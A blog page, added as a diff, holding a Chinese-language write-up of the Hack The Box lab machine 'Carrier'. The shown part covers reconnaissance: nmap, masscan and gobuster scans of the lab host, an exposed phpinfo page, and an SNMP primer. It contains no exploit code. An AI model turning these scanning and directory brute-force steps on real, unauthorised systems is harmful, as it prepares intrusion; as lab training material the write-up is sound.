@@ -1,0 +1,671 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.4.1">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.0.0/css/all.min.css" integrity="sha256-jTIdiMuX/e3DGJUGwl3pKSxuc6YOuqtJYkM0bGQESA4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.10.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":{"gitalk":{"order":-2}}},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":"ture","trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="看来还是要从高分往低分去做 呜呜呜">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB Carrier">
+<meta property="og:url" content="http://example.com/2022/07/30/HTB-Carrier/index.html">
+<meta property="og:site_name" content="b1ue0cean&#39;s   blog">
+<meta property="og:description" content="看来还是要从高分往低分去做 呜呜呜">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2022/07/30/HTB-Carrier/image-20220730135632941.png">
+<meta property="og:image" content="http://example.com/2022/07/30/HTB-Carrier/diagram_for_tac.png">
+<meta property="og:image" content="http://example.com/2022/07/30/HTB-Carrier/image-20220801221801885.png">
+<meta property="og:image" content="http://example.com/2022/07/30/HTB-Carrier/1641805247_61dbf5bf35eaff7c66e33.jpeg">
+<meta property="og:image" content="http://example.com/2022/07/30/HTB-Carrier/v2-315b593f06c45856ce70de5e2d8d8ec2_1440w.jpg">
+<meta property="og:image" content="http://example.com/2022/07/30/HTB-Carrier/1641805341_61dbf61d0762d2e683677.jpeg">
+<meta property="og:image" content="http://example.com/2022/07/30/HTB-Carrier/image-20220801233558415.png">
+<meta property="og:image" content="http://example.com/2022/07/30/HTB-Carrier/1641805894_61dbf846f127775bd0cf4.jpeg">
+<meta property="og:image" content="http://example.com/2022/07/30/HTB-Carrier/1641805938_61dbf872e61277d133d94.jpeg">
+<meta property="og:image" content="http://example.com/2022/07/30/HTB-Carrier/1641805972_61dbf8945cb1e5a640a45.jpeg">
+<meta property="og:image" content="http://example.com/2022/07/30/HTB-Carrier/1641805987_61dbf8a307d0fcec572cd.jpeg">
+<meta property="og:image" content="http://example.com/2022/07/30/HTB-Carrier/1641805999_61dbf8afd9ec1c48455c6.jpeg">
+<meta property="og:image" content="http://example.com/2022/07/30/HTB-Carrier/1641806378_61dbfa2a9d557d318c4ad.jpeg">
+<meta property="og:image" content="http://example.com/2022/07/30/HTB-Carrier/1641806281_61dbf9c9c97837ed6a1a8.jpeg">
+<meta property="og:image" content="http://example.com/2022/07/30/HTB-Carrier/1641806255_61dbf9af395a3b33b012f.jpeg">
+<meta property="og:image" content="http://example.com/2022/07/30/HTB-Carrier/1641806225_61dbf9913416bd30af2d6.jpeg">
+<meta property="og:image" content="http://example.com/2022/07/30/HTB-Carrier/1641806105_61dbf919c59d8d8c30207.jpeg">
+<meta property="og:image" content="http://example.com/2022/07/30/HTB-Carrier/image-20220802003007736.png">
+<meta property="og:image" content="http://example.com/2022/07/30/HTB-Carrier/image-20220802003346930.png">
+<meta property="og:image" content="http://example.com/2022/07/30/HTB-Carrier/image-20220802003328767.png">
+<meta property="og:image" content="http://example.com/2022/07/30/HTB-Carrier/image-20220802004055803.png">
+<meta property="og:image" content="http://example.com/2022/07/30/HTB-Carrier/image-20220802004942414.png">
+<meta property="article:published_time" content="2022-07-30T05:42:02.000Z">
+<meta property="article:modified_time" content="2022-08-01T17:40:17.001Z">
+<meta property="article:author" content="b1ue0cean">
+<meta property="article:tag" content="HTB">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/07/30/HTB-Carrier/image-20220730135632941.png">
+
+
+<link rel="canonical" href="http://example.com/2022/07/30/HTB-Carrier/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2022/07/30/HTB-Carrier/","path":"2022/07/30/HTB-Carrier/","title":"HTB Carrier"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>HTB Carrier | b1ue0cean's   blog</title>
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="b1ue0cean's   blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">b1ue0cean's   blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">welcome to my world -- sharing CTF & ML skills</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section">Home</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section">About</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section">Tags<span class="badge">65</span></a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section">Categories<span class="badge">48</span></a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section">Archives<span class="badge">96</span></a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B8%97%E9%80%8F"><span class="nav-number">1.</span> <span class="nav-text">渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">1.1.</span> <span class="nav-text">1.信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E5%88%9D%E6%AD%A5%E6%B5%8B%E8%AF%95"><span class="nav-number">1.2.</span> <span class="nav-text">2.初步测试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E7%BB%A7%E7%BB%AD%E5%81%9A%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">1.3.</span> <span class="nav-text">2.继续做信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%95%A5%E6%98%AFsnmp%EF%BC%9F"><span class="nav-number">1.3.1.</span> <span class="nav-text">啥是snmp？</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#SNMP%E5%9F%BA%E7%A1%80"><span class="nav-number">1.3.1.1.</span> <span class="nav-text">SNMP基础</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%AE%80%E4%BB%8B"><span class="nav-number">1.3.1.1.1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9E%B6%E6%9E%84"><span class="nav-number">1.3.1.1.2.</span> <span class="nav-text">架构</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#SNMP%E7%89%88%E6%9C%AC"><span class="nav-number">1.3.1.1.3.</span> <span class="nav-text">SNMP版本</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Community-String"><span class="nav-number">1.3.1.2.</span> <span class="nav-text">Community String</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#MIB%E5%92%8COID"><span class="nav-number">1.3.1.3.</span> <span class="nav-text">MIB和OID</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#UDP-%E5%92%8C-TCP-%E5%95%A5%E5%8C%BA%E5%88%AB%EF%BC%9F"><span class="nav-number">1.3.2.</span> <span class="nav-text">UDP 和 TCP 啥区别？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8EUDP%E7%9A%84%E6%89%AB%E6%8F%8F"><span class="nav-number">1.3.3.</span> <span class="nav-text">基于UDP的扫描</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#nmap%E6%89%AB%E6%8F%8F"><span class="nav-number">1.3.3.1.</span> <span class="nav-text">nmap扫描</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#msf%E6%89%AB%E6%8F%8F"><span class="nav-number">1.3.3.2.</span> <span class="nav-text">msf扫描</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#net-snmp"><span class="nav-number">1.3.3.3.</span> <span class="nav-text">net-snmp</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-%E6%89%93snmp"><span class="nav-number">1.4.</span> <span class="nav-text">4.打snmp</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%BB%98%E8%AE%A4%E5%AF%86%E7%A0%81%E5%B0%9D%E8%AF%95-amp-%E7%88%86%E7%A0%B4"><span class="nav-number">1.4.1.</span> <span class="nav-text">默认密码尝试&amp;爆破</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#snmp%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0"><span class="nav-number">1.4.2.</span> <span class="nav-text">snmp攻击学习</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96"><span class="nav-number">1.4.2.1.</span> <span class="nav-text">敏感信息获取</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AE%BE%E5%A4%87%E9%85%8D%E7%BD%AE%E4%BF%AE%E6%94%B9"><span class="nav-number">1.4.2.2.</span> <span class="nav-text">设备配置修改</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SNMP-rce"><span class="nav-number">1.4.2.3.</span> <span class="nav-text">SNMP rce</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">1.4.2.4.</span> <span class="nav-text">参考</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-%E7%99%BB%E5%BD%95%E5%90%8E%E7%BB%A7%E7%BB%AD%E6%B5%8B%E8%AF%95"><span class="nav-number">1.5.</span> <span class="nav-text">5.登录后继续测试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-%E8%B7%AF%E7%94%B1%E5%8A%AB%E6%8C%81%E9%83%A8%E5%88%86"><span class="nav-number">1.6.</span> <span class="nav-text">6.路由劫持部分</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8D%87%E5%8D%8E%E9%83%A8%E5%88%86"><span class="nav-number">2.</span> <span class="nav-text">升华部分</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="nav-number">2.1.</span> <span class="nav-text">sql注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%B1%E5%AF%86%E7%A0%81"><span class="nav-number">2.2.</span> <span class="nav-text">弱密码</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%AA%8C%E8%AF%81%E7%A0%81%E5%86%85%E5%AE%B9%E6%98%AF%E5%90%A6%E5%8F%AF%E6%8E%A7%EF%BC%9F"><span class="nav-number">2.2.1.</span> <span class="nav-text">验证码内容是否可控？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B6%8A%E6%9D%83%E4%B8%8E%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.2.2.</span> <span class="nav-text">越权与逻辑漏洞</span></a></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="b1ue0cean"
+      src="/uploads/avatar.jpeg">
+  <p class="site-author-name" itemprop="name">b1ue0cean</p>
+  <div class="site-description" itemprop="description">我就是我，人间不一样的烟火</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">96</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">48</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">65</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/godrun666" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;godrun666" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:1019076587@qq.com" title="E-Mail → mailto:1019076587@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/b1ue0cean7" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;b1ue0cean7" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://blog.csdn.net/qq_53755216" title="CSDN → https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_53755216" rel="noopener" target="_blank">CSDN</a>
+      </span>
+  </div>
+  <div class="cc-license site-overview-item animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdn.jsdelivr.net/npm/@creativecommons/vocabulary@2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/30/HTB-Carrier/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/avatar.jpeg">
+      <meta itemprop="name" content="b1ue0cean">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="b1ue0cean's   blog">
+      <meta itemprop="description" content="我就是我，人间不一样的烟火">
+    </span>
+    
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="HTB Carrier | b1ue0cean's   blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          HTB Carrier
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2022-07-30 13:42:02" itemprop="dateCreated datePublished" datetime="2022-07-30T13:42:02+08:00">2022-07-30</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-08-02 01:40:17" itemprop="dateModified" datetime="2022-08-02T01:40:17+08:00">2022-08-02</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/HTB/" itemprop="url" rel="index"><span itemprop="name">HTB</span></a>
+        </span>
+          , 
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/HTB/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>看来还是要从高分往低分去做 呜呜呜</p>
+<span id="more"></span>
+
+<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><p>先看一下端口</p>
+<p>先拿nmap去扫一下</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ nmap -sV -<span class="keyword">sT</span> -<span class="keyword">sC</span> -o nmapinitial 10.10.10.105</span><br><span class="line">Starting Nmap 7.92 ( https:<span class="comment">//nmap.org ) at 2022-07-30 01:46 EDT</span></span><br><span class="line">Nmap scan <span class="keyword">report</span> <span class="keyword">for</span> 10.10.10.105</span><br><span class="line">Host is up (0.30s latency).</span><br><span class="line">Not shown: 998 filtered tcp ports (<span class="keyword">no</span>-response)</span><br><span class="line">PORT   STATE SERVICE    <span class="keyword">VERSION</span></span><br><span class="line">22/tcp <span class="keyword">open</span>  tcpwrapped</span><br><span class="line">|_ssh-hostkey: <span class="keyword">ERROR</span>: Script execution failed (<span class="keyword">use</span> -<span class="keyword">d</span> to debug)</span><br><span class="line">80/tcp <span class="keyword">open</span>  tcpwrapped</span><br><span class="line">|_http-title: Login</span><br><span class="line"></span><br><span class="line">Service detection performed. Please <span class="keyword">report</span> any incorrect results at https:<span class="comment">//nmap.org/submit/ .</span></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned <span class="keyword">in</span> 73.20 seconds</span><br></pre></td></tr></table></figure>
+
+<p>不过没看懂这啥意思 找到一个好玩的网站 <a target="_blank" rel="noopener" href="https://explainshell.com/">https://explainshell.com/</a></p>
+<p>或者这样</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">nmap</span> -sC -sV -oA <span class="keyword">nmap</span>/initial -vv -T3 ip</span><br></pre></td></tr></table></figure>
+
+
+
+<p>Ok， 开了两个端口</p>
+<p>应该就是单点渗透了</p>
+<h2 id="2-初步测试"><a href="#2-初步测试" class="headerlink" title="2.初步测试"></a>2.初步测试</h2><p><img src="/2022/07/30/HTB-Carrier/image-20220730135632941.png" alt="image-20220730135632941"></p>
+<p>只有一个登录框</p>
+<p>先扫一下目录先</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http:<span class="regexp">//</span><span class="number">10.10</span>.<span class="number">10.105</span><span class="regexp">/ -w /u</span>sr<span class="regexp">/share/</span>wordlists<span class="regexp">/dirb/</span>common.txt -t <span class="number">100</span> </span><br></pre></td></tr></table></figure>
+
+<p>加上 -t 控制线程 会更快</p>
+<p>但有点乱说实话</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/<span class="selector-class">.hta</span>                 (Status: <span class="number">403</span>) <span class="selector-attr">[Size: 291]</span></span><br><span class="line">/<span class="selector-class">.htpasswd</span>            (Status: <span class="number">403</span>) <span class="selector-attr">[Size: 296]</span></span><br><span class="line">/<span class="selector-class">.htaccess</span>            (Status: <span class="number">403</span>) <span class="selector-attr">[Size: 296]</span></span><br><span class="line">/css                  (Status: <span class="number">301</span>) <span class="selector-attr">[Size: 310]</span> <span class="selector-attr">[--&gt; http://10.10.10.105/css/]</span></span><br><span class="line">/debug                (Status: <span class="number">301</span>) <span class="selector-attr">[Size: 312]</span> <span class="selector-attr">[--&gt; http://10.10.10.105/debug/]</span></span><br><span class="line">/doc                  (Status: <span class="number">301</span>) <span class="selector-attr">[Size: 310]</span> <span class="selector-attr">[--&gt; http://10.10.10.105/doc/]</span>  </span><br><span class="line">/<span class="selector-tag">img</span>                  (Status: <span class="number">301</span>) <span class="selector-attr">[Size: 310]</span> <span class="selector-attr">[--&gt; http://10.10.10.105/img/]</span>  </span><br><span class="line">/index<span class="selector-class">.php</span>            (Status: <span class="number">200</span>) <span class="selector-attr">[Size: 1509]</span>                                </span><br><span class="line">/js                   (Status: <span class="number">301</span>) <span class="selector-attr">[Size: 309]</span> <span class="selector-attr">[--&gt; http://10.10.10.105/js/]</span>   </span><br><span class="line">/server-status        (Status: <span class="number">403</span>) <span class="selector-attr">[Size: 300]</span>                                 </span><br><span class="line">/tools                (Status: <span class="number">301</span>) <span class="selector-attr">[Size: 312]</span> <span class="selector-attr">[--&gt; http://10.10.10.105/tools/]</span></span><br></pre></td></tr></table></figure>
+
+<p>看看存不存在弱密码或者注入</p>
+<p><strong>说实话 不知道为什么 我最近看到跳转的就不想去看了 这不对</strong></p>
+<p><strong>得到一下三点有用信息</strong></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://10.10.10.105/doc/diagram_for_tac.png">http://10.10.10.105/doc/diagram_for_tac.png</a></li>
+</ul>
+<p><img src="/2022/07/30/HTB-Carrier/diagram_for_tac.png" alt="img"></p>
+<p>这里也说明了 存在别的服务但是我们没有发现</p>
+<ul>
+<li><p><a target="_blank" rel="noopener" href="http://10.10.10.105/debug/">http://10.10.10.105/debug/</a> 直接 phpinfo 给出了</p>
+</li>
+<li><p>再来看看  <a target="_blank" rel="noopener" href="http://10.10.10.105/doc/error_codes.pdf">http://10.10.10.105/doc/error_codes.pdf</a>  这里有各种错误对应的码</p>
+</li>
+<li><img src="/2022/07/30/HTB-Carrier/image-20220801221801885.png" alt="image-20220801221801885" style="zoom: 50%;"></li>
+</ul>
+<p>可以看到的是页面上已经有两个错误码了</p>
+<p>45007 和 45009</p>
+<h2 id="2-继续做信息收集"><a href="#2-继续做信息收集" class="headerlink" title="2.继续做信息收集"></a>2.继续做信息收集</h2><p>nmap怎么才能更详细地去扫？</p>
+<p>我觉得我要重新学习一边nmap 我太菜了</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/264941.html">NMAP参数详解 - FreeBuf网络安全行业门户</a></p>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">UDP</span>扫描：（UDP扫描费时，所以去掉-p-，默认扫描）nmap -sU <span class="built_in">ip</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -sU <span class="number">10.10.10.105</span></span><br></pre></td></tr></table></figure>
+
+<p>这里我实在是受不了了 太慢了</p>
+<p>改用 masscan</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">masscan</span> --rate=<span class="number">1000</span> -p U:<span class="number">0</span>-<span class="number">65535</span> --banners <span class="number">10.10.10.105</span></span><br></pre></td></tr></table></figure>
+
+<p>快多了 但却是没扫出来啊啊啊啊啊</p>
+<p>什么情况</p>
+<p>只有这样才扫出来？大无语</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU -o nmapudp 10.10.10.105</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">PORT</span>    STATE SERVICE</span><br><span class="line"><span class="number">161</span>/udp <span class="keyword">open</span>  snmp</span><br></pre></td></tr></table></figure>
+
+<p>ok 可以来看看 这 161 端口</p>
+<h3 id="啥是snmp？"><a href="#啥是snmp？" class="headerlink" title="啥是snmp？"></a>啥是snmp？</h3><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/319234.html">实战SNMP服务攻击 - FreeBuf网络安全行业门户</a></p>
+<h4 id="SNMP基础"><a href="#SNMP基础" class="headerlink" title="SNMP基础"></a>SNMP基础</h4><h5 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h5><p>SNMP全称简单网络管理协议，是专门设计用于在IP网络管理网络节点（服务器、工作站、路由器、交换机及HUBS等）的一种标准协议，是一种应用层协议。通过SNMP可以访问设备信息、改写和配置设备参数等，SNMP运行在UDP161端口上，采用UDP协议在管理端和agent之间传输信息。</p>
+<h5 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h5><p>SNMP架构主要分如下三个部分组成：</p>
+<ul>
+<li><strong>网络管理系统（NMS，Network-management systems）</strong></li>
+<li><strong>被管理的设备（managed device）</strong></li>
+<li><strong>代理者（agent）</strong></li>
+</ul>
+<p>上面这三部分从名字上看很复杂，其实很简单。我们只需要知道，”NMS”就是客户端，”被管理的设备”就是交换机、路由器之类的设备，而”代理者”可以理解为装在交换机上的一个程序而已。</p>
+<h5 id="SNMP版本"><a href="#SNMP版本" class="headerlink" title="SNMP版本"></a>SNMP版本</h5><p>SNMP目前共有<strong>v1、v2c、v3</strong>这三个版本：</p>
+<ul>
+<li>SNMP v1是SNMP协议的最初版本，不过依然是众多厂家实现SNMP的基本方式；</li>
+<li>SNMP v2c通常被指是基于Community的SNMP v2c，<strong>而Community本质上就是密码；</strong></li>
+<li>SNMP v3是最新版本的SNMP，它对网络管理最大的贡献在于其安全性，增加了对认证和密文传输的支持。</li>
+</ul>
